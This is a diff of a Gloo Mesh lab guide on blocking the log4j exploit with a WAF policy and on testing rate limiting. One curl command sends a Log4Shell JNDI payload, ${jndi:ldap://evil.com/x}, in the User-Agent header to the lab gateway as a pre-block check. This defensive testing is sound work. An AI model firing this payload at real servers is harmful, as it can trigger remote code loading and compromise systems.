@@ -678,7 +678,7 @@ In this section of the lab, take a quick look at how to prevent the `log4j` expl
 2. Confirm that a malicious JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY
+curl -ik -I -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY
 ```
 
 3. With the Gloo Mesh WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
@@ -920,7 +920,7 @@ kubectl --context ${MGMT} delete ExtAuthPolicy frontend -n web-team
 * Test Rate Limiting
 
 ```sh
-for i in {1..6}; do curl -iksS -X GET http://$GLOO_GATEWAY | tail -n 10; done
+for i in {1..6}; do curl -iksS -X GET https://$GLOO_GATEWAY | tail -n 10; done
 ```
 
 * Expected Response - If you try the Online Boutique UI you will see a blank page because the rate-limit response is in the headers
